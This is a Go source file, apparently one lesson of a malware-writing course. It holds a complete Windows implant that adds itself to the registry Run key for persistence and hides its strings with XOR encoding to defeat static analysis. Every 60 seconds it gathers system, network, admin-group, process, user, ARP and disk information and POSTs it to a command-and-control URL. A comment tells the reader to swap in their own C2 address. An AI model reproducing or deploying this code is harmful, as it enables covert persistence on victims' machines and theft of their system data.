package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// ============================================================
// L07 — XOR STRING OBFUSCATION
// What changed from v3:
//   All hardcoded strings are removed from plaintext.
//   They are stored as XOR-encoded byte arrays.
//   The decode() function recovers them at runtime only.
//   Running strings.exe on this binary will NOT show
//   the C2 URL, registry path, or command strings.
// ============================================================

// XOR key — single byte. Both encoder and decoder use the same key.
// The key itself is in the binary, but without knowing which bytes
// belong to which string, static analysis is significantly harder.
const xorKey byte = 0x5A

// decode recovers a plaintext string from a pre-encoded byte slice.
// XOR is its own inverse: decode(encode(s)) == s
func decode(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = v ^ xorKey
	}
	return string(out)
}

// ============================================================
// PRE-ENCODED STRINGS
// These byte arrays were produced by XOR-encoding each string
// with key 0x5A. The original strings no longer exist in the
// source or in the compiled binary. They are recovered at
// runtime by calling decode() immediately before use.
//
// To encode a new string:
//   for each byte b: encoded = b ^ 0x5A
// ============================================================

// http://192.168.1.10:5000/beacon
var encC2URL = []byte{ //You gotta change this to your own C2 URL before compiling sorry go back to the lesson and do that (just change v3s C2 URL to the one you want, then XOR-encode it and replace the byte array here	)
	0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x63, 0x68,
	0x74, 0x6b, 0x6c, 0x62, 0x74, 0x6b, 0x74, 0x6b, 0x6a, 0x60,
	0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x38, 0x3f, 0x3b, 0x39, 0x35, 0x34,
}

// HKCU\Software\Microsoft\Windows\CurrentVersion\Run
var encRegPath = []byte{
	0x12, 0x11, 0x19, 0x0f, 0x06, 0x09, 0x35, 0x3c, 0x2e, 0x2d,
	0x3b, 0x28, 0x3f, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29,
	0x35, 0x3c, 0x2e, 0x06, 0x0d, 0x33, 0x34, 0x3e, 0x35, 0x2d,
	0x29, 0x06, 0x19, 0x2f, 0x28, 0x28, 0x3f, 0x34, 0x2e, 0x0c,
	0x3f, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x08, 0x2f, 0x34,
}

// ReconBeacon
var encRegName = []byte{
	0x08, 0x3f, 0x39, 0x35, 0x34, 0x18, 0x3f, 0x3b, 0x39, 0x35, 0x34,
}

// C:\temp
var encTempDir = []byte{0x19, 0x60, 0x06, 0x2e, 0x3f, 0x37, 0x2a}

// C:\temp\recon_combined.txt
var encFilePath = []byte{
	0x19, 0x60, 0x06, 0x2e, 0x3f, 0x37, 0x2a, 0x06, 0x28, 0x3f,
	0x39, 0x35, 0x34, 0x05, 0x39, 0x35, 0x37, 0x38, 0x33, 0x34,
	0x3f, 0x3e, 0x74, 0x2e, 0x22, 0x2e,
}

// recon_combined.txt
var encFileName = []byte{
	0x28, 0x3f, 0x39, 0x35, 0x34, 0x05, 0x39, 0x35, 0x37, 0x38,
	0x33, 0x34, 0x3f, 0x3e, 0x74, 0x2e, 0x22, 0x2e,
}

// systeminfo
var encSysinfo = []byte{0x29, 0x23, 0x29, 0x2e, 0x3f, 0x37, 0x33, 0x34, 0x3c, 0x35}

// netstat -ano
var encNetstat = []byte{0x34, 0x3f, 0x2e, 0x29, 0x2e, 0x3b, 0x2e, 0x7a, 0x77, 0x3b, 0x34, 0x35}

// net localgroup administrators
var encLocalgrp = []byte{
	0x34, 0x3f, 0x2e, 0x7a, 0x36, 0x35, 0x39, 0x3b, 0x36, 0x3d,
	0x28, 0x35, 0x2f, 0x2a, 0x7a, 0x3b, 0x3e, 0x37, 0x33, 0x34,
	0x33, 0x29, 0x2e, 0x28, 0x3b, 0x2e, 0x35, 0x28, 0x29,
}

// tasklist /fo csv
var encTasklist = []byte{0x2e, 0x3b, 0x29, 0x31, 0x36, 0x33, 0x29, 0x2e, 0x7a, 0x75, 0x3c, 0x35, 0x7a, 0x39, 0x29, 0x2c}

// quser
var encQuser = []byte{0x2b, 0x2f, 0x29, 0x3f, 0x28}

// arp -a
var encArp = []byte{0x3b, 0x28, 0x2a, 0x7a, 0x77, 0x3b}

// wmic logicaldisk get size,freespace,caption
var encWmic = []byte{
	0x2d, 0x37, 0x33, 0x39, 0x7a, 0x36, 0x35, 0x3d, 0x33, 0x39,
	0x3b, 0x36, 0x3e, 0x33, 0x29, 0x31, 0x7a, 0x3d, 0x3f, 0x2e,
	0x7a, 0x29, 0x33, 0x20, 0x3f, 0x76, 0x3c, 0x28, 0x3f, 0x3f,
	0x29, 0x2a, 0x3b, 0x39, 0x3f, 0x76, 0x39, 0x3b, 0x2a, 0x2e,
	0x33, 0x35, 0x34,
}

func main() {
	exePath, _ := os.Executable()

	// Persistence — decode registry strings at runtime only
	regPath := decode(encRegPath)
	regName := decode(encRegName)
	persistCmd := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`, regPath, regName, exePath)
	exec.Command("cmd", "/C", persistCmd).Run()

	// Decode C2 URL once — reused every beacon cycle
	c2URL := decode(encC2URL)

	for {
		os.MkdirAll(decode(encTempDir), 0755)
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		var content string

		content += "=== RECONNAISSANCE REPORT ===\n"
		content += fmt.Sprintf("Generated: %s\n\n", timestamp)
		content += fmt.Sprintf("Beacon Cycle: %d\n\n", time.Now().Unix())

		content += "=== NETWORK INTERFACES ===\n"
		interfaces, _ := net.Interfaces()
		for _, i := range interfaces {
			addrs, _ := i.Addrs()
			content += fmt.Sprintf("Interface: %s (%v)\n", i.Name, addrs)
		}
		content += "\n"

		// All command strings decoded at runtime from byte arrays
		content += "=== SYSTEM INFORMATION ===\n"
		cmd := exec.Command("cmd", "/C", decode(encSysinfo))
		output, _ := cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 1. NETWORK CONNECTIONS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encNetstat))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 2. LOCAL ADMINS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encLocalgrp))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 3. RUNNING PROCESSES ===\n"
		cmd = exec.Command("cmd", "/C", decode(encTasklist))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 4. LOGGED-IN USERS ===\n"
		cmd = exec.Command("cmd", "/C", decode(encQuser))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 5. ARP CACHE ===\n"
		cmd = exec.Command("cmd", "/C", decode(encArp))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		content += "=== 6. DISK INFORMATION ===\n"
		cmd = exec.Command("cmd", "/C", decode(encWmic))
		output, _ = cmd.Output()
		content += string(output) + "\n\n"

		path := decode(encFilePath)
		os.WriteFile(path, []byte(content), 0644)

		hostname, _ := os.Hostname()
		sendToC2(c2URL, path, hostname, decode(encFileName))

		fmt.Printf("Beacon sent at %s. Sleeping 60s...\n", timestamp)
		time.Sleep(60 * time.Second)
	}
}

func sendToC2(url, filepath, hostID, filename string) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(data))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Filename", filename) // decoded at call site
	req.Header.Set("X-Host", hostID)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("C2 Response: %s\n", string(respBody))
}
